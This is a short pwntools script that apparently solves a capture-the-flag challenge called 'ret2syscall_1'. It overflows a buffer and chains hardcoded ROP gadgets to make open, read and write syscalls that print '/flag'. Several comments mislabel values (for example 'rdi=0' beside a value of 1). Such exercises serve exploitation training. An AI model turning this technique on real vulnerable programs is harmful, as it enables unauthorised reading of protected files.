#!/usr/bin/env python

from pwn import *

context.log_level = "debug"
proc = process("/challenge/ret2syscall_1")
# proc = process("./ret2syscall_1")

flag_addr = 0x402008    # /falg
# flag_addr = 0x402009    # falg
buf_addr = 0x404048
syscall_addr = 0x401182 # syscall

pop_rax = 0x401180  # pop_rax; ret
pop_rdx = 0x40117e  # pop_rdx; ret
pop_rdi = 0x4012b3  # pop_rdi; ret
pop_rsi = 0x4012b1  # pop_rsi; pop r15; ret

payload = cyclic(0x10)  # buf
payload += cyclic(8)   # saved_rbp

payload += p64(pop_rsi)
payload += p64(0)   # rsi=0
payload += cyclic(8)    # r15

payload += p64(pop_rdi)
payload += p64(flag_addr)   # rdi=/flag

payload += p64(pop_rax)
payload += p64(2)   # rax=2

payload += p64(syscall_addr) # open("/flag", 0)

payload += p64(pop_rdx)
payload += p64(0x100)   # rdx=0x100

payload += p64(pop_rsi)
payload += p64(buf_addr)   # rsi=buf
payload += cyclic(8)    # r15

payload += p64(pop_rdi)
payload += p64(3)   # rdi=3

payload += p64(pop_rax)
payload += p64(0)   # rax=0

payload += p64(syscall_addr) # read(3, buf, 0x100)

payload += p64(pop_rdx)
payload += p64(0x100)   # rdx=0x100

payload += p64(pop_rsi)
payload += p64(buf_addr)   # rsi=buf
payload += cyclic(8)    # r15

payload += p64(pop_rdi)
payload += p64(1)   # rdi=0

payload += p64(pop_rax)
payload += p64(1)   # rax=0

payload += p64(syscall_addr) # write(0, buf, 0x100)

# proc.interactive()
proc.send(payload)
proc.interactive()
